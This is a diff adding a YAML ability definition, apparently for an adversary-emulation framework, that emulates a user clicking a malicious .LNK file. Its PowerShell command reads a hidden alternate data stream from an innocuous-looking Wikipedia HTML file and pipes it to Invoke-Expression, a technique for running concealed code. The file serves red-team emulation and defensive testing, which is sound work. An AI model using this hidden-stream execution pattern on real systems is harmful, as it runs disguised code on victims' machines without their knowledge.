@@ -1,0 +1,54 @@
+ability_id: e506f811-884d-4992-aacb-514b33a0324f
+access: {}
+additional_info: {}
+buckets:
+- execution
+delete_payload: true
+description: Execute PowerShell collection command to collect and compress files of
+  specific extensions.
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup:
+  - Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+  code: null
+  command: "Set-Location -Path \"C:\\Users\\#{profile_user_day2}\\Desktop\";\n\nif(Test-Path\
+    \ -LiteralPath \"$env:appdata\\Microsoft\\kxwn.lock\"){\n  Remove-Item \"$env:appdata\\\
+    Microsoft\\kxwn.lock\" -Force;\n  Write-Host \"Removed old kxwn.lock file\";\n\
+    }\n\npowershell.exe Get-Content '.\\2016_United_States_presidential_election_-_Wikipedia.html'\
+    \ -Stream schemas | IEX;"
+  language: null
+  name: psh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup:
+  - Remove-Item "$env:appdata\Microsoft\kxwn.lock" -Force;
+  code: null
+  command: "Set-Location -Path \"C:\\Users\\#{profile_user_day2}\\Desktop\";\n\nif(Test-Path\
+    \ -LiteralPath \"$env:appdata\\Microsoft\\kxwn.lock\"){\n  Remove-Item \"$env:appdata\\\
+    Microsoft\\kxwn.lock\" -Force;\n  Write-Host \"Removed old kxwn.lock file\";\n\
+    }\n\npowershell.exe Get-Content '.\\2016_United_States_presidential_election_-_Wikipedia.html'\
+    \ -Stream schemas | IEX;"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads: []
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Click .LNK payload
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: execution
+technique_id: T1204.002
+technique_name: 'User Execution: Malicious File'
